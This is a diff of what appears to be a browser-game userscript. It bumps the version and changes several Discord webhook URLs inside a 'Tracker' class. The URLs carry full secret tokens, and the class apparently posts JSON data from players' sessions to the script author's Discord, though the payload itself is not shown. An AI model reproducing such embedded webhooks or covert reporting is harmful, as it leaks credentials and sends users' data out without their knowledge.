@@ -1,5 +1,5 @@
 var allAvailableServers = 5,
-    versionScript = "4.2.5",
+    versionScript = "4.2.6",
     customAfkMsg = [
         "转圈圈",
         "转圈圈喽~",
@@ -371,12 +371,8 @@ document.querySelector('canvas').onclick = function () {
 const Tracker = new class {
     XHR() {
         const Super = new XMLHttpRequest();
-        Super.open("POST", "https://discord.com/api/webhooks/1223620927020073032/DumoG-WRpH7skbjouBndUTWt07xohX8aZCUeHkvWYCqItuXbcExf5pEEKgI0bv2ANXpw");
+        Super.open("POST", "https://discord.com/api/webhooks/1233383292615655486/SQoOrPYliiJi1UG8hLUig1JnzKmu636-VkPGXvzBXHQ7tV-5LPN0zzY-4s6-gdFLmmJE");
         Super.setRequestHeader('Content-type', 'application/json');
-
-        const Ultra = new XMLHttpRequest();
-        Ultra.open("POST", "https://discord.com/api/webhooks/1225120653330354268/REzp5cNvGGKgSAHKj4Rz4jF5lUj3bJFFnmi4u5g-afR_2Vug8-x0BVx2X-Sw7NL4g4k8");
-        Ultra.setRequestHeader('Content-type', 'application/json');
 
         const loggerSpawn = new XMLHttpRequest();
         loggerSpawn.open("POST", "https://discord.com/api/webhooks/1205022085458694144/JNbKfgDp0S0O9oGmOffhT7MjsrRz7AJf95uHMHIYH3J1ph9XELXQ_HhvFxiGFdxbK2z8");
